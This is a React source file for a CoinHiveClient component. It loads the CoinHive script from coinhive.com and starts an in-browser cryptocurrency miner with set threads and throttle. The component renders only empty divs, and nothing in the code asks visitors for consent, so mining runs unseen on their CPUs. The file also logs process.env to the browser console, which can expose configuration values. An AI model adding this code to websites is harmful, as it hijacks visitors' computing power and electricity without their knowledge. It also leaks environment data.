import React, { Component } from 'react';
// import Idle from 'react-idle';
import loadScript from 'load-script';
// import loadScript from 'simple-load-script';

import PropTypes from 'prop-types';
import keys from '../../config/keys';
// import CoinHive from './CoinHiveApi';

class CoinHiveClient extends Component {
  constructor(props) {
    super(props);
    this.miner = null;
    this.idle = false;
  }

  static defaultProps = {
    timeout: 30000,
    threads: 2,
    throttle: 0,
    siteKey: keys.COINHIVE_PUBLIC_KEY,
    onInit: miner => {},
    onStart: miner => {},
    onStop: miner => {}
  };

  start() {
    if (this.miner) {
      this.miner.start();
      this.props.onStart(this.miner);
    }
  }

  stop() {
    if (this.miner) {
      this.miner.stop();
      this.props.onStop(this.miner);
      //   this.setState({ miner: null });
    }
  }

  async componentWillMount() {
    /* eslint-disable */

    this.miner = await new Promise(resolve => {
      loadScript('https://coinhive.com/lib/coinhive.min.js', () => {
        if (this.props.userName) {
          return resolve(
            CoinHive.User(this.props.siteKey, this.props.userName)
          );
        }
        // console.log('should be public key: ' + this.props.siteKey);
        console.log(process.env);
        return resolve(CoinHive.Anonymous(this.props.siteKey));
      });
    });
    this.handleProps(this.props);
    this.props.onInit(this.miner);
    // if (this.idle) {
    if (this.props.run) {
      this.start();
    }
    /* eslint-enable */
  }

  componentWillReceiveProps(nextProps) {
    return this.handleProps(nextProps);
  }

  handleProps({ throttle, threads }) {
    if (this.miner != null) {
      this.miner.setNumThreads(threads);
      this.miner.setThrottle(throttle);
    }
  }

  handleIdleChange = ({ idle }) => {
    if (this.miner != null) {
      if (idle) {
        this.start();
      } else {
        this.stop();
      }
    } else {
    }
    this.idle = idle;
  };

  handleRender() {
    if (this.props.run === true) {
      return (
        <div />
        // <Idle timeout={this.props.timeout} onChange={this.handleIdleChange} />
      );
    } else {
      return <div />;
    }
  }

  render() {
    return <div>{this.handleRender()}</div>;
  }
}

CoinHiveClient.PropTypes = {
  siteKey: PropTypes.string.isRequired,
  timeout: PropTypes.number,
  onInit: PropTypes.func,
  onStart: PropTypes.func,
  onStop: PropTypes.func,
  userName: PropTypes.string
};

export default CoinHiveClient;
